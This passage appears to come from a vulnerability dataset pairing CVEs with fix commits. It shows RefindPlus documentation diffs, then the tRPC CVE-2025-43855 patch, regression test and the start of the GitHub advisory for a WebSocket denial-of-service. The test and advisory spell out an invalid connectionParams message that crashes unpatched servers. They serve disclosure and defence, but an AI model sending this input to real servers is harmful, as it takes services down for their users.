the `win8` variants. Separately, RefindPlus defaults to preferring generic icons for loaders ahead of the slower to load custom icons where possible. The upstream icon search implementation involves only loading such icons after a search for custom icons has not turned anything up.\n\n@@ -194,18 +195,18 @@\nSignificant visible implementation differences vis-a-vis the upstream base are:\n - **Mac Legacy BIOS Boot:** RefindPlus originally assumed all Macs were capable of legacy BIOS boot based on code that went in upstream back in 2012 when this was a reasonable default. However, some later Intel Macs do not support legacy BIOS boot and RefindPlus now attempts to categorise Macs to enable/disable legacy boot accordingly.\n   - > Activate the RefindPlus-specific `disable_legacy_sync` configuration token to base legacy BIOS boot availability on the old assumption.\n - **Secondary Configuration Files:** While the upstream documentation prohibits including tertiary configuration files from secondary configuration files, there is no mechanism enforcing this prohibition. Hence, tertiary, quaternary, quinary, and more, configuration files can in fact be included.\n-  - > The RefindPlus implementation enforces the limitation for inclusion to secondary configuration files.\n+  - > RefindPlus enforces the limitation for inclusion to secondary configuration files.\n - **Shortcut Keys:** RefindPlus does not allocate shortcut keys based on the operating system type/name as there is no way of knowing what would actually be loaded in many cases.\n   - > Keys are allocated based on display position in the order of `Key 1` to `Key Z`.\n   - > Alphabetic `Keys I and O` are not used while Numeric `Key 0` is reserved for internal use.\n   - > Keys are not allocated to `Tools` apart from `Key A` for `About Refindplus` and `Key Z` for `System Shutdown`.\n - **Disabled Manual Stanzas:** The processing of a user configured boot stanza is halted, and the `Entry` object immediately discarded, once a `Disabled` setting is encountered. The outcome is the same as upstream, which always continues to create and return a fully built object that is later discarded in such cases. The approach adopted in RefindPlus allows for an optimised loading process particularly when such `Disabled` tokens are placed immediately after the `menuentry` line (see examples near the bottom of the `config.conf-sample` file).\n   - > This also applies to `submenuentry` items which can be enabled or disabled separately.\n - **Pointer Device Priority:** The upstream implementation of pointer device priority is based on how the `enable_mouse` and `enable_touch` pointer device control tokens appear in the configuration file(s) when both are active. The last pointer device control token read in the main configuration file and/or any supplementary/override configuration file will be used and the other disregarded. In RefindPlus however, `enable_touch` always takes priority when both tokens are active without regard to the order of appearance in the configuration file(s).\n-  - > Hence, to use a mouse in RefindPlus, `enable_touch` must be disabled (default) in addition to enabling `enable_mouse`.\n+  - > Keep `enable_touch` disabled, in addition to setting `enable_mouse`, to use a mouse in RefindPlus.\n \n ## Roll Your Own\n \n-Refer to [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for build instructions.\n+Refer to [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for build instructions.\n \n-[CLICK HERE](https://github.com/dakanji/RefindPlus/blob/GOPFix/README-Dev.md) for the ReadMe file related to the current (work in progress) code base.\n+[CLICK HERE](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/README-Dev.md) for the ReadMe file related to the current (work in progress) code base.\n```\n\nFilename: README.md:\n```\n@@ -6,11 +6,11 @@\nA Boot Manager for Mac and PC\n \n <br>\n \n-[![Release Version](https://img.shields.io/github/v/release/dakanji/RefindPlus?style=for-the-badge&color=informational&label=current)](https://github.com/dakanji/RefindPlus/releases)[![Release Date](https://img.shields.io/github/release-date/dakanji/RefindPlus.svg?display_date=published_at&style=for-the-badge&color=informational&label=)](https://github.com/dakanji/RefindPlus/releases)\n+[![Release Version](https://img.shields.io/github/v/release/dakanji/RefindPlus?style=for-the-badge&color=informational&label=current)](https://github.com/RefindPlusRepos/RefindPlus/releases)[![Release Date](https://img.shields.io/github/release-date/dakanji/RefindPlus.svg?display_date=published_at&style=for-the-badge&color=informational&label=)](https://github.com/RefindPlusRepos/RefindPlus/releases)\n \n [![Coverity Scan](https://img.shields.io/coverity/scan/22695)](https://scan.coverity.com/projects/22695)&nbsp;&nbsp;&nbsp;[![Codacy Grade](https://img.shields.io/codacy/grade/d2955171e96246579279c1a28c4b11cf?label=codacy)](https://app.codacy.com/gh/dakanji/RefindPlus/dashboard)\n \n-[![License Type](https://img.shields.io/badge/GPL%203.0/Later-blue?label=copies)](https://github.com/dakanji/RefindPlus/blob/GOPFix/INFO.txt)\n+[![License Type](https://img.shields.io/badge/GPL%203.0/Later-blue?label=copies)](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/INFO.txt)\n \n </div>\n\n@@ -53,7 +53,7 @@\nSome features:\n \n ## Installation\n \n-[MyBootMgr](https://www.dakanji.com/creations/index.html) is recommended to automate installing RefindPlus when running Mac OS on Intel-based Macs. Alternatively, as the RefindPlus efi file can function as a drop-in replacement for the upstream efi file, the [rEFInd package](https://www.rodsbooks.com/refind/installing.html) can be installed first and its efi file replaced with the RefindPlus efi file (Rename RefindPlus file to match). This allows installing RefindPlus on other compatible operating systems supported upstream. See `UEFI Secure Boot` under the [Divergence Section](https://github.com/dakanji/RefindPlus#divergence) for how to enable this if required.\n+[MyBootMgr](https://www.dakanji.com/creations/index.html) is recommended to automate installing RefindPlus when running Mac OS on Intel-based Macs. Alternatively, as the RefindPlus efi file can function as a drop-in replacement for the upstream efi file, the [rEFInd package](https://www.rodsbooks.com/refind/installing.html) can be installed first and its efi file replaced with the RefindPlus efi file (Rename RefindPlus file to match). This allows installing RefindPlus on other compatible operating systems supported upstream. See `UEFI Secure Boot` under the [Divergence Section](https://github.com/RefindPlusRepos/RefindPlus#divergence) for how to enable this if required.\n \n > [!NOTE]\n >\n\n@@ -65,7 +65,7 @@\nUpstream post-release code updates are typically ported to RefindPlus as they ha\n >\n > Consider replacing upstream filesystem drivers with those packaged with RefindPlus as these are always either exactly the same as upstream versions or have had fixes applied.\n \n-RefindPlus will function with the upstream configuration file, `refind.conf`, but users may wish to replace this with the RefindPlus configuration file, `config.conf`, to configure the additional options provided by RefindPlus. A sample RefindPlus configuration file is available here: [config.conf-sample](https://github.com/dakanji/RefindPlus/blob/GOPFix/config.conf-sample).\n+RefindPlus will function with the upstream configuration file, `refind.conf`, but users may wish to replace this with the RefindPlus configuration file, `config.conf`, to configure the additional options provided by RefindPlus. A sample RefindPlus configuration file is available here: [config.conf-sample](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/config.conf-sample).\n \n > [!TIP]\n >\n\n@@ -75,18 +75,18 @@\nWhen run without activating RefindPlus-specific configuration options, as will b\n \n > [!NOTE]\n >\n-> This equivalence is subject to some differences such as outlined under the [Divergence Section](https://github.com/dakanji/RefindPlus#divergence) below.\n+> This equivalence is subject to some differences such as outlined under the [Divergence Section](https://github.com/RefindPlusRepos/RefindPlus#divergence) below.\n \n ## Additional Functionality\n \n-RefindPlus-specific funtionality can be configured using the tokens below.<br>\n-Additional information is provided in the sample RefindPlus configuration file.<br>\n+RefindPlus-specific funtionality can be configured using the tokens below.\\\n+Additional information is provided in the sample RefindPlus configuration file.\\\n These tokens are included in `Section 1` of the sample RefindPlus configuration file.\n \n Token | Functionality\n ----- | -----\n continue_on_warning   |Proceed as if a key was pressed after screen warnings (for unattended boot)\n-csr_dynamic           |Actively sets or unsets Apple's `Configurable Security Restrictions` (CSR)\n+csr_dynamic           |Actively sets or unsets Apple's `Configurable Security Restrictions (CSR)`\n csr_normalise         |Removes the `APPLE_INTERNAL` bit, when present, to permit OTA updates\n decline_help_icon     |Disables feature that may improve loading speed by preferring generic icons\n decline_help_size     |Disables feature that sets additional UI scaling for very high DPI screens\n\n@@ -148,11 +148,12 @@\nIn addition to the new functionality listed above, the following upstream tokens\n   - This is equivalent to activating the `csr_normalise` token.\n - **\"log_level\":** Controls the native log format and an implementation of the upstream format.\n   - Levels 0, 1, or 2 can be specified.\n-    - Level 0 activates the native succinct log format.\n-    - Level 1 is broadly equivalent to the verbose upstream Level 4 format (Upstream Levels 1 to 3 were dispensed with)\n+    - Level 0 activates the succinct native log format.\n+    - Level 1 is broadly equivalent to the verbose upstream Level 4 format\n+      - Upstream Levels 1 to 3 were dispensed with\n     - Level 2 is only exposed on `NOOPT` builds and outputs logs at a very detailed level\n       - The RefindPlus build script will create `NOOPT` builds when passed `ALL` or `NPT` as a second parameter\n-        - Setting `ALL` includes an `NPT` build to the standard `REL` and `DBG` builds created\n+        - Setting `ALL` adds an `NPT` build to the standard `REL` and `DBG` builds created\n         - Setting `NPT` creates only that build type\n           - Applies to setting `REL` or `DBG`\n       - The first parameter is the build branch, which also needs to be specified in such instances\n\n@@ -168,14 +169,14 @@\nIn addition to the new functionality listed above, the following upstream tokens\n Significant visible implementation differences vis-a-vis the upstream base are:\n - **UEFI Secure Boot:** RefindPlus binaries are currently not signed for secure boot support and do not include the `Secure Boot Advanced Targeting (SBAT)` sections required by Shim v15.3/newer.\n   - > The process [outlined here](https://www.rodsbooks.com/refind/secureboot.html#installation) for signing self built upstream binaries can be followed to enable suport.\n-  - > An adaptation of the process for RefindPlus is [provided here](https://github.com/dakanji/RefindPlus/discussions/190#discussioncomment-10130431). Modify for newer releases as required.\n+  - > An adaptation of the process for RefindPlus is [provided here](https://github.com/RefindPlusRepos/RefindPlus/discussions/190#discussioncomment-10130431). Modify for newer releases as required.\n   - > Refer to [this summation](https://forum.manjaro.org/t/howto-enable-secure-boot-with-refind/121403/6) for futher insight.\n - **GZipped Loaders:** RefindPlus only provides stub support for handling GZipped loaders as this is largely only relevant for units on the ARM architecture.\n   - > This stub support is only used for debug logging in RefindPlus and can be activated using the same `support_gzipped_loaders` configuration token as upstream.\n - **Screenshots:** These are saved in the PNG format with a significantly smaller file size.\n-  - > Additionally, the file naming is different and the files are always saved to the same ESP as the RefindPlus efi file.\n+  - > Additionally, the file naming is different and files are always saved to the same ESP RefindPlus.\n - **UI Flags:** RefindPlus requires that any desired previously set `hideui` configuration token options are explicitly defined in supplementary/theme configuration files; as whenever the token is found in such files, the token setting is reset by RefindPlus to the specified option(s). The upstream implementation effectively adds new settings to any previously existing ones for this configuration token instead.\n-  - > The RefindPlus implementation maintains consistency with how other configuration tokens are handled.\n+  - > RefindPlus maintains consistency with how other configuration tokens are handled.\n - **UI Scaling:** WQHD monitors are correctly determined not to be HiDPI monitors and UI elements are not scaled up on such monitors when the RefindPlus-specific `scale_ui` configuration token is set to automatically detect the screen resolution. RefindPlus also takes vertically orientated screens into account and additionally scales UI elements down when low resolution screens (less than 1025px on the longest edge) are detected.\n   - > Additionally, UI elements on extremely high resultion screens (greater than 5999px on the longest edge) receive a `4X scaling` as opposed to the `2X scaling` applied for standard HiDPI screens.\n - **Loader Icons:** RefindPlus prefers `os_windows` and `boot_windows` icon files, if present, over `os_win` and `boot_win` and the `win8` variants. Separately, RefindPlus defaults to preferring generic icons for loaders ahead of the slower to load custom icons where possible. The upstream icon search implementation involves only loading such icons after a search for custom icons has not turned anything up.\n\n@@ -193,18 +194,18 @@\nSignificant visible implementation differences vis-a-vis the upstream base are:\n - **Mac Legacy BIOS Boot:** RefindPlus originally assumed all Macs were capable of legacy BIOS boot based on code that went in upstream back in 2012 when this was a reasonable default. However, some later Intel Macs do not support legacy BIOS boot and RefindPlus now attempts to categorise Macs to enable/disable legacy boot accordingly.\n   - > Activate the RefindPlus-specific `disable_legacy_sync` configuration token to base legacy BIOS boot availability on the old assumption.\n - **Secondary Configuration Files:** While the upstream documentation prohibits including tertiary configuration files from secondary configuration files, there is no mechanism enforcing this prohibition. Hence, tertiary, quaternary, quinary, and more, configuration files can in fact be included.\n-  - > The RefindPlus implementation enforces the limitation for inclusion to secondary configuration files.\n+  - > RefindPlus enforces the limitation for inclusion to secondary configuration files.\n - **Shortcut Keys:** RefindPlus does not allocate shortcut keys based on the operating system type/name as there is no way of knowing what would actually be loaded in many cases.\n   - > Keys are allocated based on display position in the order of `Key 1` to `Key Z`.\n   - > Alphabetic `Keys I and O` are not used while Numeric `Key 0` is reserved for internal use.\n   - > Keys are not allocated to `Tools` apart from `Key A` for `About Refindplus` and `Key Z` for `System Shutdown`.\n - **Disabled Manual Stanzas:** The processing of a user configured boot stanza is halted, and the `Entry` object immediately discarded, once a `Disabled` setting is encountered. The outcome is the same as upstream, which always continues to create and return a fully built object that is later discarded in such cases. The approach adopted in RefindPlus allows for an optimised loading process particularly when such `Disabled` tokens are placed immediately after the `menuentry` line (see examples near the bottom of the `config.conf-sample` file).\n   - > This also applies to `submenuentry` items which can be enabled or disabled separately.\n - **Pointer Device Priority:** The upstream implementation of pointer device priority is based on how the `enable_mouse` and `enable_touch` pointer device control tokens appear in the configuration file(s) when both are active. The last pointer device control token read in the main configuration file and/or any supplementary/override configuration file will be used and the other disregarded. In RefindPlus however, `enable_touch` always takes priority when both tokens are active without regard to the order of appearance in the configuration file(s).\n-  - > Hence, to use a mouse in RefindPlus, `enable_touch` must be disabled (default) in addition to enabling `enable_mouse`.\n+  - > Keep `enable_touch` disabled, in addition to setting `enable_mouse`, to use a mouse in RefindPlus.\n \n ## Roll Your Own\n \n-Refer to [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for build instructions.\n+Refer to [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for build instructions.\n \n-[CLICK HERE](https://github.com/dakanji/RefindPlus/blob/GOPFix/README-Dev.md) for the ReadMe file related to the current (work in progress) code base.\n+[CLICK HERE](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/README-Dev.md) for the ReadMe file related to the current (work in progress) code base.\n```\n\nFilename: config.conf-sample:\n```\n@@ -137,14 +137,14 @@\n# of Windows or Linux to mimic a BGRT. This feature can be leveraged to define\n # custom exit splash screens by taking advantage of the following behaviour:\n #   - 'boot_outlogo' file will be used if present\n-#   - 'boot_distroname' will be used if present otherwise\n-#   - 'os_distroname' will be used if present otherwise\n+#   - 'boot_{distro}' will be used if present otherwise\n+#   - 'os_{distro}' will be used if present otherwise\n #\n # The options below are available:\n #   Win   - Disable Bootlogo for Windows Loaders\n #   Lin   - Disable Bootlogo for Linux Stub Loaders\n #   All   - Disable Bootlogo for Every Type of Loader\n-#   Off   - Disable Bootlogo for None of the Above (Default)\n+#   Off   - Disable Bootlogo for None of these Loaders (Default)\n #\n # NOTES:\n # 1. The 'All' option takes precedence over others apart from 'Off'\n```\n\nFilename: config.conf-sample-Dev:\n```\n@@ -137,14 +137,14 @@\n# of Windows or Linux to mimic a BGRT. This feature can be leveraged to define\n # custom exit splash screens by taking advantage of the following behaviour:\n #   - 'boot_outlogo' file will be used if present\n-#   - 'boot_distroname' will be used if present otherwise\n-#   - 'os_distroname' will be used if present otherwise\n+#   - 'boot_{distro}' will be used if present otherwise\n+#   - 'os_{distro}' will be used if present otherwise\n #\n # The options below are available:\n #   Win   - Disable Bootlogo for Windows Loaders\n #   Lin   - Disable Bootlogo for Linux Stub Loaders\n #   All   - Disable Bootlogo for Every Type of Loader\n-#   Off   - Disable Bootlogo for None of the Above (Default)\n+#   Off   - Disable Bootlogo for None of these Loaders (Default)\n #\n # NOTES:\n # 1. The 'All' option takes precedence over others apart from 'Off'\n\n@@ -876,7 +876,7 @@\n# HiddenTools, and HiddenLegacy variables and does not apply to any variables from\n # other processes/libraries (These are always written to the motherboard's nvRAM).\n #\n-# Stores RefindPlus-Specific variables on the filesystem when commented out\n+# Stores RefindPlus-specific variables on the filesystem when commented out\n #\n #use_nvram\n```",
                "url": "https://github.com/RefindPlusRepo/RefindPlus/commit/4d35125ca689a255647e9033dd60c257d26df7cb"
            }
        ],
        "published_date": "2025-04-28T05:31:05.213Z",
        "sec_adv": [],
        "sw_version": "v0.14.2.AB",
        "sw_version_wget": "https://github.com/RefindPlusRepo/RefindPlus/archive/refs/tags/v0.14.2.AB.zip"
    },
    "CVE-2025-43855": {
        "cwe": [
            {
                "id": "CWE-248",
                "value": "CWE-248: Uncaught Exception"
            }
        ],
        "description": "tRPC allows users to build & consume fully typesafe APIs without schemas or code generation. In versions starting from 11.0.0 to before 11.1.1, an unhandled error is thrown when validating invalid connectionParams which crashes a tRPC WebSocket server. This allows any unauthenticated user to crash a tRPC 11 WebSocket server. Any tRPC 11 server with WebSocket enabled with a createContext method set is vulnerable. This issue has been patched in version 11.1.1.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* Don't throw already handled error\n\nThis error has already been handled so no need to re-throw. If we re-throw it will not be caught and will trigger an uncaught exception causing the entire server process to crash.\n\n* regression test\n\n* fewer promises\n\n* undef -> null\n\n---------\n\nCo-authored-by: Alexander Johansson <alexander@n1s.se>\n\nFilename: packages/server/src/adapters/fastify/fastifyTRPCPlugin.ts:\n```\n@@ -68,8 +68,8 @@\nexport function fastifyTRPCPlugin<TRouter extends AnyRouter>(\n       ...trpcOptions,\n     });\n \n-    fastify.get(prefix ?? '/', { websocket: true }, async (socket, req) => {\n-      await onConnection(socket, req.raw);\n+    fastify.get(prefix ?? '/', { websocket: true }, (socket, req) => {\n+      onConnection(socket, req.raw);\n       if (trpcOptions?.keepAlive?.enabled) {\n         const { pingMs, pongWaitMs } = trpcOptions.keepAlive;\n         handleKeepAlive(socket, pingMs, pongWaitMs);\n```\n\nFilename: packages/server/src/adapters/ws.ts:\n```\n@@ -34,6 +34,8 @@\nimport {\n   type MaybePromise,\n } from '../unstable-core-do-not-import';\n // eslint-disable-next-line no-restricted-imports\n+import type { Result } from '../unstable-core-do-not-import';\n+// eslint-disable-next-line no-restricted-imports\n import { iteratorResource } from '../unstable-core-do-not-import/stream/utils/asyncIterable';\n import { Unpromise } from '../vendor/unpromise';\n import { createURL, type NodeHTTPCreateContextFnOptions } from './node-http';\n\n@@ -98,14 +100,16 @@\nexport type WSSHandlerOptions<TRouter extends AnyRouter> =\n     dangerouslyDisablePong?: boolean;\n   };\n \n-const unsetContextPromiseSymbol = Symbol('unsetContextPromise');\n export function getWSConnectionHandler<TRouter extends AnyRouter>(\n   opts: WSSHandlerOptions<TRouter>,\n ) {\n   const { createContext, router } = opts;\n   const { transformer } = router._def._config;\n \n-  return async (client: ws.WebSocket, req: IncomingMessage) => {\n+  return (client: ws.WebSocket, req: IncomingMessage) => {\n+    type Context = inferRouterContext<TRouter>;\n+    type ContextResult = Result<Context>;\n+\n     const clientSubscriptions = new Map<number | string, AbortController>();\n     const abortController = new AbortController();\n\n@@ -122,26 +126,31 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n       );\n     }\n \n-    function createCtxPromise(\n+    async function createCtxPromise(\n       getConnectionParams: () => TRPCRequestInfo['connectionParams'],\n-    ): Promise<inferRouterContext<TRouter>> {\n-      return run(async () => {\n-        ctx = await createContext?.({\n-          req,\n-          res: client,\n-          info: {\n-            connectionParams: getConnectionParams(),\n-            calls: [],\n-            isBatchCall: false,\n-            accept: null,\n-            type: 'unknown',\n-            signal: abortController.signal,\n-            url: null,\n-          },\n-        });\n+    ): Promise<ContextResult> {\n+      try {\n+        return await run(async (): Promise<ContextResult> => {\n+          ctx = await createContext?.({\n+            req,\n+            res: client,\n+            info: {\n+              connectionParams: getConnectionParams(),\n+              calls: [],\n+              isBatchCall: false,\n+              accept: null,\n+              type: 'unknown',\n+              signal: abortController.signal,\n+              url: null,\n+            },\n+          });\n \n-        return ctx;\n-      }).catch((cause) => {\n+          return {\n+            ok: true,\n+            value: ctx,\n+          };\n+        });\n+      } catch (cause) {\n         const error = getTRPCErrorFromUnknown(cause);\n         opts.onError?.({\n           error,\n\n@@ -167,12 +176,14 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n         (globalThis.setImmediate ?? globalThis.setTimeout)(() => {\n           client.close();\n         });\n-\n-        throw error;\n-      });\n+        return {\n+          ok: false,\n+          error,\n+        };\n+      }\n     }\n \n-    let ctx: inferRouterContext<TRouter> | undefined = undefined;\n+    let ctx: Context | undefined = undefined;\n \n     /**\n      * promise for initializing the context\n\n@@ -182,18 +193,40 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n      */\n     let ctxPromise =\n       createURL(req).searchParams.get('connectionParams') === '1'\n-        ? unsetContextPromiseSymbol\n+        ? null\n         : createCtxPromise(() => null);\n \n-    async function handleRequest(msg: TRPCClientOutgoingMessage) {\n+    function handleRequest(msg: TRPCClientOutgoingMessage) {\n       const { id, jsonrpc } = msg;\n \n-      /* istanbul ignore next -- @preserve */\n       if (id === null) {\n-        throw new TRPCError({\n-          code: 'BAD_REQUEST',\n-          message: '`id` is required',\n+        const error = getTRPCErrorFromUnknown(\n+          new TRPCError({\n+            code: 'PARSE_ERROR',\n+            message: '`id` is required',\n+          }),\n+        );\n+        opts.onError?.({\n+          error,\n+          path: undefined,\n+          type: 'unknown',\n+          ctx,\n+          req,\n+          input: undefined,\n         });\n+        respond({\n+          id,\n+          jsonrpc,\n+          error: getErrorShape({\n+            config: router._def._config,\n+            error,\n+            type: 'unknown',\n+            path: undefined,\n+            input: undefined,\n+            ctx,\n+          }),\n+        });\n+        return;\n       }\n       if (msg.method === 'subscription.stop') {\n         clientSubscriptions.get(id)?.abort();\n\n@@ -202,20 +235,25 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n       const { path, lastEventId } = msg.params;\n       let { input } = msg.params;\n       const type = msg.method;\n-      try {\n-        if (lastEventId !== undefined) {\n-          if (isObject(input)) {\n-            input = {\n-              ...input,\n-              lastEventId: lastEventId,\n-            };\n-          } else {\n-            input ??= {\n-              lastEventId: lastEventId,\n-            };\n-          }\n+\n+      if (lastEventId !== undefined) {\n+        if (isObject(input)) {\n+          input = {\n+            ...input,\n+            lastEventId: lastEventId,\n+          };\n+        } else {\n+          input ??= {\n+            lastEventId: lastEventId,\n+          };\n+        }\n+      }\n+      run(async () => {\n+        // eslint-disable-next-line @typescript-eslint/no-non-null-assertion\n+        const res = await ctxPromise!; // asserts context has been set\n+        if (!res.ok) {\n+          throw res.error;\n         }\n-        await ctxPromise; // asserts context has been set\n \n         const abortController = new AbortController();\n         const result = await callTRPCProcedure({\n\n@@ -384,7 +422,7 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n             type: 'started',\n           },\n         });\n-      } catch (cause) /* istanbul ignore next -- @preserve */ {\n+      }).catch((cause) => {\n         // procedure threw an error\n         const error = getTRPCErrorFromUnknown(cause);\n         opts.onError?.({ error, path, type, ctx, req, input });\n\n@@ -400,9 +438,9 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n             ctx,\n           }),\n         });\n-      }\n+      });\n     }\n-    client.on('message', async (rawData) => {\n+    client.on('message', (rawData) => {\n       // eslint-disable-next-line @typescript-eslint/no-base-to-string\n       const msgStr = rawData.toString();\n       if (msgStr === 'PONG') {\n\n@@ -414,7 +452,7 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n         }\n         return;\n       }\n-      if (ctxPromise === unsetContextPromiseSymbol) {\n+      if (!ctxPromise) {\n         // If the ctxPromise wasn't created immediately, we're expecting the first message to be a TRPCConnectionParamsMessage\n         ctxPromise = createCtxPromise(() => {\n           let msg;\n\n@@ -438,31 +476,36 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n         });\n         return;\n       }\n-      try {\n-        const msgJSON: unknown = JSON.parse(msgStr);\n-        const msgs: unknown[] = Array.isArray(msgJSON) ? msgJSON : [msgJSON];\n-        const promises = msgs\n-          .map((raw) => parseTRPCMessage(raw, transformer))\n-          .map(handleRequest);\n-        await Promise.all(promises);\n-      } catch (cause) {\n-        const error = new TRPCError({\n-          code: 'PARSE_ERROR',\n-          cause,\n-        });\n \n-        respond({\n-          id: null,\n-          error: getErrorShape({\n-            config: router._def._config,\n-            error,\n-            type: 'unknown',\n-            path: undefined,\n-            input: undefined,\n-            ctx: undefined,\n-          }),\n-        });\n-      }\n+      const parsedMsgs = run(() => {\n+        try {\n+          const msgJSON: unknown = JSON.parse(msgStr);\n+          const msgs: unknown[] = Array.isArray(msgJSON) ? msgJSON : [msgJSON];\n+\n+          return msgs.map((raw) => parseTRPCMessage(raw, transformer));\n+        } catch (cause) {\n+          const error = new TRPCError({\n+            code: 'PARSE_ERROR',\n+            cause,\n+          });\n+\n+          respond({\n+            id: null,\n+            error: getErrorShape({\n+              config: router._def._config,\n+              error,\n+              type: 'unknown',\n+              path: undefined,\n+              input: undefined,\n+              ctx,\n+            }),\n+          });\n+\n+          return [];\n+        }\n+      });\n+\n+      parsedMsgs.map(handleRequest);\n     });\n \n     // WebSocket errors should be handled, as otherwise unhandled exceptions will crash Node.js.\n\n@@ -487,10 +530,6 @@\nexport function getWSConnectionHandler<TRouter extends AnyRouter>(\n       clientSubscriptions.clear();\n       abortController.abort();\n     });\n-\n-    if (ctxPromise !== unsetContextPromiseSymbol) {\n-      await ctxPromise;\n-    }\n   };\n }\n\n@@ -544,22 +583,7 @@\nexport function applyWSSHandler<TRouter extends AnyRouter>(\n       return;\n     }\n \n-    onConnection(client, req).catch((cause) => {\n-      opts.onError?.({\n-        error: new TRPCError({\n-          code: 'INTERNAL_SERVER_ERROR',\n-          cause,\n-          message: 'Failed to handle WebSocket connection',\n-        }),\n-        req: req,\n-        path: undefined,\n-        type: 'unknown',\n-        ctx: undefined,\n-        input: undefined,\n-      });\n-\n-      client.close();\n-    });\n+    onConnection(client, req);\n   });\n \n   return {\n```\n\nFilename: packages/tests/server/websockets.test.ts:\n```\n@@ -12,7 +12,9 @@\nimport { observable, observableToAsyncIterable } from '@trpc/server/observable';\n import type {\n   TRPCClientOutgoingMessage,\n   TRPCRequestMessage,\n+  TRPCResponse,\n } from '@trpc/server/rpc';\n+import type { DefaultErrorShape } from '@trpc/server/unstable-core-do-not-import';\n import {\n   createDeferred,\n   sleep,\n\n@@ -1828,6 +1830,53 @@\ndescribe('auth / connectionParams', async () => {\n     });\n     expect(ctx.wss.clients.size).toBe(1);\n   });\n+\n+  test('regression: bad connection params', async () => {\n+    async function connect() {\n+      const ws = new WebSocket(ctx.wssUrl + '?connectionParams=1');\n+      await new Promise((resolve) => {\n+        ws.addEventListener('open', resolve);\n+      });\n+      function request(str: string) {\n+        ws.send(str);\n+        return new Promise<Res>((resolve, reject) => {\n+          ws.addEventListener('message', (it) => {\n+            resolve(JSON.parse(it.data as string));\n+          });\n+          ws.addEventListener('error', reject);\n+          ws.addEventListener('close', reject);\n+        });\n+      }\n+      return { request };\n+    }\n+\n+    type Res = TRPCResponse<unknown, DefaultErrorShape>;\n+\n+    const badConnectionParams = JSON.stringify({\n+      method: 'connectionParams',\n+      data: { invalidConnectionParams: null },\n+    });\n+\n+    {\n+      const client = await connect();\n+      const res = await client.request(badConnectionParams);\n+\n+      assert('error' in res);\n+      expect(res.error.message).toMatchInlineSnapshot(\n+        `\"Invalid connection params shape\"`,\n+      );\n+    }\n+\n+    {\n+      const client = await connect();\n+      const res = await client.request(badConnectionParams);\n+\n+      assert('error' in res);\n+      expect(res.error.message).toMatchInlineSnapshot(\n+        `\"Invalid connection params shape\"`,\n+      );\n+    }\n+  });\n });\n \n describe('subscriptions with createCaller', () => {\n```",
                "url": "https://github.com/trpc/trpc/commit/9beb26c636d44852e0f407f3d7a82ad54df65b4d"
            }
        ],
        "published_date": "2025-04-24T13:58:30.536Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ntrpc\n/\ntrpc\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.4k\nStar 37.3k\nCode\nIssues\n134\nPull requests\n48\nDiscussions\nActions\nSecurity\n1\nInsights\nAdditional navigation options\ntRPC 11 WebSocket DoS Vulnerability\nHigh KATT published GHSA-pj3v-9cm8-gvj8 3 weeks agoApr 24, 2025\nPackage\nnpm @trpc/server\n(\nnpm\n)\nAffected versions\nv11.0.0\nPatched versions\nv11.1.1\nDescription\nSummary\nAn unhandled error is thrown when validating invalid connectionParams which crashes a tRPC WebSocket server. This allows any unauthenticated user to crash a tRPC 11 WebSocket server.\nDetails\nAny tRPC 11 server with WebSocket enabled with a createContext method set is vulnerable. Here is an example:\ntrpc-vuln.mp4\nI have a working reproduction here if you would like to test: https://github.com/lukechilds/trpc-vuln-reproduction\nThe connectionParams logic introduced in #5839 does not safely handle invalid connectionParams objects. During validation if the object does not match an expected shape an error will be thrown:\ntrpc/packages/server/src/unstable-core-do-not-import/http/parseConnectionParams.ts\nLines 27 to 33 in 8cef54e\n } catch (cause) { \n   throw new TRPCError({ \n     code: 'PARSE_ERROR', \n     message: 'Invalid connection params shape', \n     cause, \n   }); \n } \nThis is called during WebSocket connection setup inside createCtxPromise() here:\ntrpc/packages/server/src/adapters/ws.ts\nLine 435 in 8cef54e\n const connectionParams = parseConnectionParamsFromUnknown(msg.data); \ncreateCtxPromise has handling to catch any errors and pass them up to the opts.onError handler:\ntrpc/packages/server/src/adapters/ws.ts\nLines 144 to 173 in 8cef54e\n   }).catch((cause) => { \n     const error = getTRPCErrorFromUnknown(cause); \n     opts.onError?.({ \n       error, \n       path: undefined, \n       type: 'unknown', \n       ctx, \n       req, \n       input: undefined, \n     }); \n     respond({ \n       id: null, \n       error: getErrorShape({ \n         config: router._def._config, \n         error, \n         type: 'unknown', \n         path: undefined, \n         input: undefined, \n         ctx, \n       }), \n     }); \n        // close in next tick \n     (globalThis.setImmediate ?? globalThis.setTimeout)(() => { \n       client.close(); \n     }); \n        throw error; \n   }); \n } \nHowever the error handler then rethrows the error:\ntrpc/packages/server/src/adapters/ws.ts\nLine 171 in 8cef54e\n throw error; \nSince this is all triggered from the WebSocket message event there is no higher level error handling so this causes an uncaught exception and crashes the server process.\nThis means any tRPC 11 server with WebSockets enabled can be crashed by an attacker sending an invalid connectionParams object. It doesn't matter if the server doesn't make user of connectionParams, the connectionParams logic can be initiated by the client.\nTo fix this vulnerability tRPC should not rethrow the error after it's be handled. This patch fixes the vulnerability:\nFrom 5747b1d11946f60268eb86c59784bd6f7eb50abd Mon Sep 17 